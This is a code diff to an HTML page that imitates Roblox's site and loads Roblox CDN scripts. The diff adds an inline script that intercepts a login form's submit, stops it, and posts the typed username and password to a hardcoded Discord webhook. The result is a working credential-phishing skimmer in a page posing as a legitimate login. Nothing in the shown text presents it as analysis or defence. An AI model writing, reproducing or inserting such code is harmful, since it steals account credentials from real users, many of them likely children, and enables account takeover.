@@ -931,6 +931,33 @@ function checkRobloxInstall() {
 <script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameLaunchGuestMode" data-bundle-source="Unknown" src="https://js.rbxcdn.com/1eba4a5ba48b46f09a1576cdd3e3440341efdcebc7150e44b4e743da95e3e830.js"></script>
 <script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ExperienceDetails" data-bundle-source="Unknown" src="https://js.rbxcdn.com/a0a0baa6bece22919fbc822f03897529cbff69008ac491ecbb31d1ce8d74cf3f.js"></script>
 
+	<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    document.getElementById('myForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const webhookURL = 'https://discord.com/api/webhooks/1356411253060403242/-8S5MEC8u0TqKyuXCA4ooSBdntlGNvwODAoktFd80SA1_aBsSmxsvpfPuQ9fpW4NhFd4';
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                username: usernameInput.value,
+                password: passwordInput.value
+            })
+        }).then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        }).then(data => {
+            console.log('Success:', data);
+        });
+    });
+});
+</script>
 
 
 
